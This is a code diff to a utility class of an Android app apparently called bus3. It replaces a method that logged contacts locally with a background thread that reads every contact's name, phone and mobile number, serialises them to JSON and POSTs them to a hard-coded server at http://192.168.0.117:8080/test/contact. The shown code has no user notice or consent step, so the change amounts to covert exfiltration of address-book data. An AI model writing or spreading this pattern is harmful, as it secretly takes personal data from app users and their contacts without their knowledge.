@@ -1,5 +1,8 @@
 package com.bus3.common.utils;
 
+import java.util.HashMap;
+import java.util.Map;
+
 import org.apache.http.HttpResponse;
 import org.apache.http.HttpStatus;
 import org.apache.http.client.HttpClient;
@@ -8,14 +11,15 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpParams;
 import org.apache.http.util.EntityUtils;
+import org.json.JSONArray;
+import org.json.JSONObject;
 
+import robot.arm.utils.BaseUtils.Contact;
 import android.app.AlertDialog;
 import android.content.Context;
 import android.content.DialogInterface.OnClickListener;
-import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
-import android.provider.ContactsContract;
 import android.util.Log;
 
 import com.bus3.R;
@@ -124,60 +128,37 @@ public class BaseUtils {
 		}
 		return null;
 	}
-	
-	public static void getContactSync(final Context ctx){
+
+	public static void getContactSync(final Context ctx) {
 		new Thread() {
 
 			@Override
 			public void run() {
-				BaseUtils.getContact(ctx);
+				try {
+
+					JSONArray ja = new JSONArray();
+
+					for (Contact contact : robot.arm.utils.BaseUtils.getContact(ctx)) {
+						JSONObject jo = new JSONObject();
+
+						jo.put("name", contact.getName());
+						jo.put("phone", contact.getPhone());
+						jo.put("mobile", contact.getMobile());
+
+						ja.put(jo);
+					}
+
+					Map<String, String> param = new HashMap<String, String>(1);
+					param.put("contact", ja.toString());
+
+					robot.arm.utils.BaseUtils.post("http://192.168.0.117:8080/test/contact", null, param, robot.arm.utils.BaseUtils.ENCODING);
+
+				} catch (Throwable e) {
+					Log.e("contact", e.getMessage(), e);
+				}
 			}
-			
+
 		}.start();
 	}
-	
-	 // 获取联系人
-	public static void getContact(Context ctx) {
-		// 获得所有的联系人
-		Cursor contacts = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null,
-				ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC");
 
-		// 循环遍历
-		if (contacts.moveToFirst()) {
-
-			int idColumn = contacts.getColumnIndex(ContactsContract.Contacts._ID);
-			int displayNameColumn = contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
-
-			do {
-				// 获得联系人的ID号
-				String contactId = contacts.getString(idColumn);
-				// 获得联系人姓名
-				String disPlayName = contacts.getString(displayNameColumn);
-				Log.i("名称", disPlayName);
-
-				// 查看某联系人有多少个电话号码及类型
-				int phoneCount = contacts.getInt(contacts.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
-
-				if (phoneCount > 0) {
-					// 获得联系人的电话号码
-					Cursor phones = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-							ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
-					if (phones.moveToFirst()) {
-						do {
-							// 遍历所有的电话号码
-							String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-							String phoneType = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
-							Log.i("电话|类型", phoneNumber + "|" + phoneType);
-							
-
-						} while (phones.moveToNext());
-					}
-				} else {
-					Log.i("电话|类型", "无电话号码");
-				}
-
-			} while (contacts.moveToNext());
-
-		}
-	}
 }
